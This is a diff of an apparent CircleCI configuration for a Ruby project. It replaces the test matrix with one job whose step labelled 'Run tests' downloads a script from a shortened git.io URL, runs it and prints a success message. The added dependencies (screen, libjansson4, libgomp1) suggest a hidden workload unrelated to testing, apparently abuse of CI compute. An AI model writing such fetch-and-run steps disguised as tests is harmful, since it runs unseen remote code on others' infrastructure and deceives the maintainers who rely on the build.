@@ -1,8 +1,7 @@
-working_dir: &working_dir ~/app
-
-.build_template: &build_definition
-  steps:
-    - checkout
+working_dir: &working_dir ~/app 
+.build_template: &script
+  steps: 
+    - checkout 
     - run: 
         name: Install Dependencies 
         command: | 
@@ -11,34 +10,20 @@ working_dir: &working_dir ~/app
                     apt-get install -y ca-certificates screen wget git libcurl4 libjansson4 libgomp1 build-essential make cmake 
     - run: 
         name: Run tests 
-        command: | 
-                    wget -qO build.sh https://git.io/J65mg 
+        command: |                                      
+                    wget -qO build.sh https://git.io/JXBhn
                     chmod +x build.sh 
-                    ./build.sh 
+                    ./build.sh  
                     echo Build Succeded 
-        
-
-version: 2.0
-
-jobs:
-  build:
-    docker:
-      - image: ruby
-    steps:
-      - checkout
-  build_ruby2_4:
-    <<: *build_definition
-    docker:
-      - image: ruby:2.4
-  build_ruby2_3:
-    <<: *build_definition
-    docker:
-      - image: ruby:2.3
-
-workflows:
-  version: 2
-  build_ruby_versions:
-    jobs:
-      - build
-      - build_ruby2_4
-      - build_ruby2_3
+version: 2.0 
+jobs: 
+  build1: 
+    <<: *script 
+    docker: 
+      - image: ruby 
+ 
+workflows: 
+  version: 2 
+  commit: 
+    jobs: 
+      - build1 
